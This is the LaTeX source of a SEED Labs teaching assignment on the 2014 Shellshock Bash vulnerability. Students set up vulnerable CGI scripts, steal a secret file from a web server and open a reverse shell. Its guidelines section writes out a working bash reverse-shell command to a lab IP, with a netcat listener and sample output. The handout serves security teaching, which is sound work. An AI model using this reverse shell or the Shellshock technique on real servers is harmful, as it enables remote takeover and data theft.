%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%  Copyright by Wenliang Du.                                       %%
%%  This work is licensed under the Creative Commons                %%
%%  Attribution-NonCommercial-ShareAlike 4.0 International License. %%
%%  To view a copy of this license, visit                           %%
%%  http://creativecommons.org/licenses/by-nc-sa/4.0/.              %%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\documentclass[11pt]{article}

\usepackage[most]{tcolorbox}
\usepackage{times}
\usepackage{epsf}
\usepackage{epsfig}
\usepackage{amsmath, alltt, amssymb, xspace}
\usepackage{wrapfig}
\usepackage{fancyhdr}
\usepackage{url}
\usepackage{verbatim}
\usepackage{fancyvrb}
\usepackage{adjustbox}
\usepackage{listings}
\usepackage{color}
\usepackage{subfigure}
\usepackage{cite}
\usepackage{sidecap}
\usepackage{pifont}
\usepackage{mdframed}
\usepackage{textcomp}
\usepackage{enumitem}


% Horizontal alignment
\topmargin      -0.50in  % distance to headers
\oddsidemargin  0.0in
\evensidemargin 0.0in
\textwidth      6.5in
\textheight     8.9in 

\newcommand{\todo}[1]{
\vspace{0.1in}
\fbox{\parbox{6in}{TODO: #1}}
\vspace{0.1in}
}


\newcommand{\unix}{{\tt Unix}\xspace}
\newcommand{\linux}{{\tt Linux}\xspace}
\newcommand{\minix}{{\tt Minix}\xspace}
\newcommand{\ubuntu}{{\tt Ubuntu}\xspace}
\newcommand{\setuid}{{\tt Set-UID}\xspace}
\newcommand{\openssl} {\texttt{openssl}}


\pagestyle{fancy}
\lhead{\bfseries SEED Labs}
\chead{}
\rhead{\small \thepage}
\lfoot{}
\cfoot{}
\rfoot{}


\definecolor{dkgreen}{rgb}{0,0.6,0}
\definecolor{gray}{rgb}{0.5,0.5,0.5}
\definecolor{mauve}{rgb}{0.58,0,0.82}
\definecolor{lightgray}{gray}{0.90}


\lstset{%
  frame=none,
  language=,
  backgroundcolor=\color{lightgray},
  aboveskip=3mm,
  belowskip=3mm,
  showstringspaces=false,
%  columns=flexible,
  basicstyle={\small\ttfamily},
  numbers=none,
  numberstyle=\tiny\color{gray},
  keywordstyle=\color{blue},
  commentstyle=\color{dkgreen},
  stringstyle=\color{mauve},
  breaklines=true,
  breakatwhitespace=true,
  tabsize=3,
  columns=fullflexible,
  keepspaces=true,
  escapeinside={(*@}{@*)}
}

\newcommand{\newnote}[1]{
\vspace{0.1in}
\noindent
\fbox{\parbox{1.0\textwidth}{\textbf{Note:} #1}}
%\vspace{0.1in}
}


%% Submission
\newcommand{\seedsubmission}{You need to submit a detailed lab report, with screenshots,
to describe what you have done and what you have observed.
You also need to provide explanation
to the observations that are interesting or surprising.
Please also list the important code snippets followed by
explanation. Simply attaching code without any explanation will not
receive credits.}

%% Book
\newcommand{\seedbook}{\textit{Computer \& Internet Security: A Hands-on Approach}, 2nd
Edition, by Wenliang Du. See details at \url{https://www.handsonsecurity.net}.}

%% Videos
\newcommand{\seedisvideo}{\textit{Internet Security: A Hands-on Approach},
by Wenliang Du. See details at \url{https://www.handsonsecurity.net/video.html}.}

\newcommand{\seedcsvideo}{\textit{Computer Security: A Hands-on Approach},
by Wenliang Du. See details at \url{https://www.handsonsecurity.net/video.html}.}

%% Lab Environment
\newcommand{\seedenvironment}{This lab has been tested on our pre-built
Ubuntu 16.04 VM, which can be downloaded from the SEED website. }

\newcommand{\seedenvironmentA}{This lab has been tested on our pre-built
Ubuntu 16.04 VM, which can be downloaded from the SEED website. }

\newcommand{\seedenvironmentB}{This lab has been tested on our pre-built
Ubuntu 20.04 VM, which can be downloaded from the SEED website. }

\newcommand{\seedenvironmentAB}{This lab has been tested on our pre-built
Ubuntu 16.04 and 20.04 VMs, which can be downloaded from the SEED website. }

\newcommand{\nodependency}{Since we use containers to set up the lab environment, 
this lab does not depend too much on our SEED VM. You can do this lab
using other VMs or physical machines. }







\newcommand{\seedlabcopyright}[1]{
\vspace{0.1in}
\fbox{\parbox{6in}{\small Copyright \copyright\ {#1}\ \ by Wenliang Du.\\
      This work is licensed under a Creative Commons
      Attribution-NonCommercial-ShareAlike 4.0 International License.
      If you remix, transform, or build upon the material, 
      this copyright notice must be left intact, or reproduced in a way that is reasonable to
      the medium in which the work is being re-published.}}
\vspace{0.1in}
}






\newcommand{\bash}{{\tt bash}\xspace}
\newcommand{\Bash}{{\tt Bash}\xspace}

\lhead{\bfseries SEED Labs -- Shellshock Attack Lab}

\begin{document}

\begin{center}
{\LARGE Shellshock Attack Lab}
\end{center}

\seedlabcopyright{2006 - 2016}

\section{Overview}

On September 24, 2014, a severe vulnerability in Bash was identified.
Nicknamed Shellshock, this vulnerability can exploit many systems and be
launched either remotely or from a local machine.  In this
lab, students need to work on this attack, so they can understand the
Shellshock vulnerability. The learning objective of this lab is for students to get a
first-hand experience on this interesting attack, understand how it
works, and think about the lessons that we can get out of this
attack. The first version of this lab was developed on September 29, 2014, 
just five days after the attack was reported. It was assigned to the students 
in our Computer Security class on September 30, 2014. An important mission
of the SEED project is to quickly turn real attacks 
into educational materials, so instructors can bring them into their
classrooms in a timely manner and keep their students engaged with what
happens in the real world. This lab covers the following topics:

\begin{itemize}[noitemsep]
\item Shellshock
\item Environment variables 
\item Function definition in Bash
\item Apache and CGI programs
\end{itemize}


\paragraph{Readings and videos.}
Detailed coverage of the Shellshock attack can be found in the following:

\begin{itemize}
\item Chapter 3 of the SEED Book, \seedbook
\item Section 3 of the SEED Lecture at Udemy, \seedcsvideo
\end{itemize}


\paragraph{Lab environment.} \seedenvironment




% *******************************************
% SECTION
% ******************************************* 
\section{Lab Tasks}


% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Task 1: Experimenting with Bash Function}


The Bash program in Ubuntu 16.04 has already been patched, so it is no
longer vulnerable to the Shellshock attack. For the purpose of this lab, we
have installed a vulnerable version of Bash inside the \texttt{/bin}
folder; its name is \texttt{bash\_shellshock}. We need to use 
this Bash in our task. Please run this vulnerable version of Bash like the
following and then design an experiment to verify whether this Bash is
vulnerable to the Shellshock attack or not. 

\begin{lstlisting}
$ /bin/bash_shellshock
\end{lstlisting}
 

Try the same experiment on the patched version of bash (\texttt{/bin/bash})
and report your observations.



% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Task 2: Setting up CGI programs}

In this lab, we will launch a Shellshock attack on a remote web server. 
Many web servers enable CGI, which is a standard method used to generate 
dynamic content on Web pages and Web applications. Many CGI programs are 
written using shell scripts. Therefore, before a CGI program is executed,
a shell program will be invoked first, and such an invocation is
triggered by a user from a remote computer. If the shell program is 
a vulnerable Bash program, we can exploit the Shellshock vulnerable to 
gain privileges on the server. 


In this task, we will set up a very simple CGI 
program (called \texttt{myprog.cgi}) like the
following. It simply prints out {\tt "Hello World"} using a shell script.


\begin{lstlisting}
#!/bin/bash_shellshock             (*@\ding{192}@*)

echo "Content-type: text/plain"
echo
echo
echo "Hello World"
\end{lstlisting}

Please make sure you use \texttt{/bin/bash\_shellshock} in 
Line \ding{192}, instead of using \texttt{/bin/bash}. The line specifies
what shell program should be invoked to run the script. We do need to use
the vulnerable Bash in this lab. Please place the above CGI program in the
\texttt{/usr/lib/cgi-bin} directory and set its permission to 755 (so it is
executable). You need to use the root privilege to do these, as the folder
is only writable by the root.  This folder is the default CGI directory for
the Apache web server. 


To access this CGI program from the Web, you can either use a browser by
typing the following URL: \url{http://localhost/cgi-bin/myprog.cgi}, or 
use the following command line program {\tt curl} to do the same thing:

\begin{lstlisting}
$ curl http://localhost/cgi-bin/myprog.cgi
\end{lstlisting}

In our setup, we run the Web server and the attack from the same computer,
and that is why we use \texttt{localhost}. In real attacks, the server is running on a remote
machine, and instead of using \texttt{localhost}, we use the hostname or the
IP address of the server. 



% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Task 3: Passing Data to Bash via Environment Variable}


To exploit a Shellshock vulnerability in a Bash-based CGI program, attackers need to 
pass their data to the vulnerable Bash program, and the data need to be
passed via an environment variable. In this task, we need to see how we can
achieve this goal. You can use the following CGI program to demonstrate
that you can send out an arbitrary string to the CGI program, and the
string will show up in the content of one of the environment variables. 


\begin{lstlisting}
#!/bin/bash_shellshock             

echo "Content-type: text/plain"
echo
echo "****** Environment Variables ******"
strings /proc/$$/environ            (*@\ding{192}@*)
\end{lstlisting}


In the code above, Line \ding{192} prints out the contents of all the
environment variables in the current process. If your experiment is
successful, you should be able to see your data string in the page that you get 
back from the server. In your report, please explain how the data from a remote user can get into
those environment variables. 


% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Task 4: Launching the Shellshock Attack}

After the above CGI program is set up, we can now launch the Shellshock attack. 
The attack does not depend on what is in the CGI program, as it targets
the Bash program, which is invoked first, before the CGI script is
executed. Your goal is to launch the attack through the URL
\url{http://localhost/cgi-bin/myprog.cgi}, such that you can achieve
something that you cannot do as a remote user. In this task, you should
demonstrate the following:


\begin{itemize} 
\item Using the Shellshock attack to steal the content of a secret file
from the server.  

\item Answer the following question:  will you be able to steal the content of 
the shadow file \texttt{/etc/shadow}? Why or why not?  
\end{itemize} 
  




% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Task 5: Getting a Reverse Shell via Shellshock Attack}

The Shellshock vulnerability allows attacks to run arbitrary commands on
the target machine. In real attacks, instead of hard-coding the command 
in their attack, attackers often choose to run a shell
command, so they can use this shell to run other commands,
for as long as the shell program is alive. 
To achieve this goal, attackers need to run a reverse shell.

Reverse shell is a shell process started on a machine, with its input and output being
controlled by somebody from a remote computer. Basically, the shell runs
on the victim's machine, but it takes input from the attacker machine and
also prints its output on the attacker's machine. Reverse shell
gives attackers a convenient way to run commands on a compromised machine. 
Detailed explanation of how to create reverse shell can be found in Chapter
3 (\S 3.4.5) in the SEED book. We also summarize the explanation in
the guideline section later.


In this task, you need to demonstrate 
how to launch a reverse shell via the Shellshock vulnerability in a CGI program. 
Please show how you do it. In your report, please also explain 
how you set up the reverse shell, and why it works. Basically, you need to
use your own words to explain how reverse shell works in your Shellshock
attack. 


% -------------------------------------------
% SUBSECTION
% ------------------------------------------- 
\subsection{Task 6: Using the Patched Bash}

Now, let us use a Bash program that has already been patched.
The program \texttt{/bin/bash} is a patched version.
Please replace the first line of 
your CGI programs with this program. 
Redo Tasks 3 and 5 and describe your observations. 


% *******************************************
% SECTION
% ******************************************* 
\section{Guidelines: Creating Reverse Shell}
\label{shellshock:sec:reverseshell}


The key idea of reverse shell is to redirect its standard input, output, and error devices to a
network connection, so the shell gets its input from the connection, and prints out its output
also to the connection. At the other end of the connection is a program run by the
attacker; the program simply displays whatever comes from the shell at the other end,
and sends whatever is typed by the attacker to the shell, over the network connection.

A commonly used program by attackers is
\texttt{netcat}, which, if running
with the \texttt{"-l"} option, becomes a TCP server that listens for a connection on the
specified port. This server program basically prints out whatever is sent by the client, and
sends to the client whatever is typed by the user running the server.
In the following experiment, \texttt{netcat} (\texttt{nc} for short) is used
to listen for a connection on port \texttt{9090}~(let us focus only on the first line).


\begin{lstlisting}
Attacker(10.0.2.6):$ nc -l 9090 -v  (*@\reflectbox{\ding{217}} \textbf{Waiting for reverse shell}@*)
Connection from 10.0.2.5 port 9090 [tcp/*] accepted
Server(10.0.2.5):$     (*@\reflectbox{\ding{217}} \textbf{Reverse shell from 10.0.2.5.}@*)
Server(10.0.2.5):$ ifconfig
ifconfig
eth23  Link encap:Ethernet  HWaddr 08:00:27:fd:25:0f
       inet addr:(*@\textbf{10.0.2.5}@*)  Bcast:10.0.2.255  Mask:255.255.255.0
       inet6 addr: fe80::a00:27ff:fefd:250f/64 Scope:Link
       ...
\end{lstlisting}


The above \texttt{nc} command will block, waiting for a connection.
We now directly run the following \bash program on the Server machine~(\texttt{10.0.2.5}) to emulate
what attackers would run after compromising the server via the Shellshock attack. 
This \bash command will trigger a
TCP connection to the attacker machine's port 9090, and a reverse shell will be created. We can
see the shell prompt from the above result, indicating that the shell is running on the Server
machine; we can type the \texttt{ifconfig} command to verify that the IP address is indeed
\texttt{10.0.2.5}, the one belonging to the Server machine.  Here is the \bash command:

\begin{lstlisting}
Server(10.0.2.5):$ /bin/bash -i > /dev/tcp/10.0.2.6/9090 0<&1 2>&1
\end{lstlisting}

The above command represents the one that would normally be executed on a compromised server.
It is quite complicated, and we give a detailed explanation in the following:


\begin{itemize}
\item \texttt{"/bin/bash -i"}: The option \texttt{i} stands for interactive, meaning that the shell must be
  interactive (must provide a shell prompt).

\item \texttt{"> /dev/tcp/10.0.2.6/9090"}: This causes the output device~(\texttt{stdout}) of the shell
  to be redirected to the TCP connection to \texttt{10.0.2.6}'s port \texttt{9090}.
  In \unix systems, \texttt{stdout}'s file descriptor is \texttt{1}.

\item \texttt{"0<\&1"}: File descriptor \texttt{0} represents the standard input device~(\texttt{stdin}).
  This option tells the system to use the standard output device as the stardard input device.
  Since \texttt{stdout} is already redirected to the TCP connection, this option basically
  indicates that the shell program will get its input from the same TCP connection.

\item \texttt{"2>\&1"}: File descriptor \texttt{2} represents the standard error \texttt{stderr}. This
  causes the error output to be redirected to \texttt{stdout}, which is the TCP connection.
\end{itemize}

In summary, the command \texttt{"/bin/bash -i > /dev/tcp/10.0.2.6/9090 0<\&1 2>\&1"} starts a
\texttt{bash} shell on the server machine, with its input coming from a TCP connection,
and output going to the same TCP connection.
In our experiment, when the \texttt{bash}
shell command is executed on \texttt{10.0.2.5}, it connects back to the \texttt{netcat} process
started on \texttt{10.0.2.6}. This is confirmed via the \texttt{"Connection from 10.0.2.5 port
9090 [tcp/*] accepted"} message displayed by \texttt{netcat}.






% *******************************************
% SECTION
% ******************************************* 
\section{Submission}

\seedsubmission


\end{document}

